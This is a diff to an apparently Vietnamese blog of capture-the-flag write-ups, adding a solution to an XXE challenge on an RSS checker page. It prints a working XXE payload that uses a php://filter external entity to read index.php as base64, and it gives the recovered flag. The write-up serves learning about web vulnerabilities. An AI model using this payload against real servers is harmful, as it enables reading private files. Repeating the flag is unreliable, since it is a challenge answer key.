@@ -338,9 +338,28 @@ Ví dụ, độ dài của cột username là 20, khi bạn insert một input l
 
 Bài này đề cập đến lỗi XXE. Chi tiết về XXE, tớ sẽ viết trong một bài blog khác, ở đây tớ xin tóm tắt vài dòng như sau: XXE attack (XML external entity attack) là một loại lỗi được tìm thấy trong các ứng dụng web, có thể cho phép hacker đọc những file quan trọng trên server.
 
-Quay trở lại đề bài. Tớ thấy có 2 page: checker và login. Page checker cho phép nhập đường dẫn RSS. Thử cho rss của vnexpress.net vào xem sao :D
+Quay trở lại đề bài. Tớ thấy có 2 page: checker và login. Page checker cho phép nhập đường dẫn RSS. Thử cho rss của vnexpress.net vào thì ok, nó parse được.
 
-![](https://farm1.staticflickr.com/690/21433671473_6c72458617_m.jpg){: .center-image}
+Tớ tạo một link rss có nội dung như sau:
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >
+]>
+<rss xmlns:slash="http://purl.org/rss/1.0/modules/slash/" version="2.0">
+	<channel>
+		<item>
+			<title>&xxe;</title>
+		</item>
+	</channel>
+</rss>
+```
+
+Sau đó, nhét link này vào cho nó parse. Đến đây, tớ được nội dung của file index.php dạng base64. Decode base64 và lấy flag :D
+
+**Flag:** _c934fed17f1cac3045ddfeca34f332bc_
 
 ###28. XPath Injection - authentication
 
